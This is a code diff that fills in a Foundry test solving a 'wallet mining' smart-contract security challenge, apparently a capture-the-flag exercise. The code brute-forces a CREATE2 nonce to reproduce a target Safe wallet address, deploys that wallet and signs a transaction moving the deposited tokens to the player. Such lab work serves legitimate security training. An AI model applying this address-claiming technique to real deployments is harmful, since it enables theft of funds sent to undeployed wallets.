@@ -157,7 +157,89 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        console.log("User address:", user);
+        console.log("Deployer address:", deployer);
+        console.log("SAFE_SINGLETON_FACTORY_ADDRESS:", SAFE_SINGLETON_FACTORY_ADDRESS);
+
+        console.log("Nonce of SAFE_SINGLETON_FACTORY_ADDRESS:", vm.getNonce(SAFE_SINGLETON_FACTORY_ADDRESS));
+
+        uint256 nonce = 0;
+
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeWithSignature(
+                                                           "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                                                           owners, // owners
+                                                           1, // threshold
+                                                           address(0), // optional delegateCall to
+                                                           bytes(""), // data for the optional delegateCall
+                                                           address(0), // fallbackHandler
+                                                           address(0), // paymentToken
+                                                           0, // payment
+                                                           address(0) // paymentReceiver
+        );
+
+
+        for (; ; nonce++){
+            // Test on https://app.safe.global/ using sepolia network to see how to deploy a Safe wallet
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+            bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
+
+            bytes32 initCodeHash = keccak256(deploymentData);
+
+            address safeAddress = vm.computeCreate2Address(salt, initCodeHash, address(proxyFactory));
+
+            if (safeAddress == USER_DEPOSIT_ADDRESS) {
+                console.log("Found target address with nonce:", nonce);
+                break;
+            }
+        }
+
+        SafeProxy userSafe = proxyFactory.createProxyWithNonce(
+            address(singletonCopy),
+            initializer,
+            nonce
+        );
+
+        console.log("User's Safe address:", address(userSafe));
+
+        bytes memory execData = abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT);
+        // bytes32 txHash = keccak256(execData);
+        bytes32  txHash = Safe(payable(userSafe)).getTransactionHash(
+                                                                     address(token),      // to
+                                                                     0,                   // value
+                                                                     execData,            // data
+                                                                     Enum.Operation.Call, // operation
+                                                                     0,                   // safeTxGas
+                                                                     0,                   // baseGas
+                                                                     0,                   // gasPrice
+                                                                     address(0),          // gasToken
+                                                                     payable(0),          // refundReceiver
+                                                                     0
+        );
+
+        // (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", txHash)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+
+        bytes memory singatures = abi.encodePacked(r, s, v);
+
+        Safe(payable(userSafe)).execTransaction(
+            address(token),      // to
+            0,                   // value
+            execData,            // data
+            Enum.Operation.Call, // operation
+            0,                   // safeTxGas
+            0,                   // baseGas
+            0,                   // gasPrice
+            address(0),          // gasToken
+            payable(0),          // refundReceiver
+            singatures           // signatures
+        );
+
+        console.log("User token balance:", token.balanceOf(user));
+        console.log("USER_DEPOSIT_ADDRESS token balance: ",token.balanceOf(USER_DEPOSIT_ADDRESS));
+
     }
 
     /**
